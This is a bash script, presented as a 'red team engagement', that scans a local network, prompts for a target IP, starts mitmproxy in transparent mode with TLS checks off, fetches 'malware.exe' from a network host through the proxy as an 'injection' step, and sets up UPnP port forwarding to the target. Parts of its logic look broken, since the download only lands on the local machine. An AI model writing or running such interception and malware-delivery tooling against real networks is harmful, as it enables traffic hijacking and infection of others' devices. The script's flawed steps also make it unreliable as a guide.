#!/bin/bash

# Function to check if required tools are installed
check_dependencies() {
    for cmd in netdiscover mitmproxy curl miniupnpc; do
        if ! command -v $cmd &> /dev/null; then
            echo "$cmd could not be found. Please install it before running this script."
            exit 1
        fi
    done
}

# Function to scan the network for devices
scan_network() {
    echo "Scanning network for devices..."
    netdiscover -r 192.168.1.0/24
}

# Function to prompt user for target IP
get_target_ip() {
    read -p "Enter the IP address of the target device (or select from the list above): " target_ip
    if ! [[ $target_ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo "Invalid IP address format."
        exit 1
    fi
}

# Function to start MITMProxy
start_mitmproxy() {
    echo "Starting MITMProxy..."
    mitmproxy --mode transparent --ssl-insecure --http2 --listen-port 8080 &
    mitmproxy_pid=$!
    sleep 5  # Wait for MITMProxy to start
}

# Function to inject executable file
inject_file() {
    local inject_url="http://192.168.1.100/malware.exe"
    echo "Injecting executable file..."
    if curl -s --proxy http://127.0.0.1:8080 -O "$inject_url"; then
        echo "File injected successfully."
    else
        echo "Failed to inject file."
        cleanup
        exit 1
    fi
}

# Function to set up UPnP port forwarding
setup_upnp() {
    echo "Attempting to set up UPnP port forwarding..."
    external_port=8081
    internal_port=8080
    if upnpc -a "$target_ip" "$internal_port" "$external_port" "MITMProxy"; then
        echo "UPnP port forwarding set up successfully."
    else
        echo "Failed to set up UPnP port forwarding."
        cleanup
        exit 1
    fi
}

# Function to clean up and stop MITMProxy
cleanup() {
    echo "Stopping MITMProxy..."
    if kill $mitmproxy_pid; then
        echo "MITMProxy stopped."
    else
        echo "Failed to stop MITMProxy."
    fi
}

# Main script execution
check_dependencies
scan_network
get_target_ip
start_mitmproxy
inject_file
setup_upnp
cleanup

echo "Red team engagement completed successfully."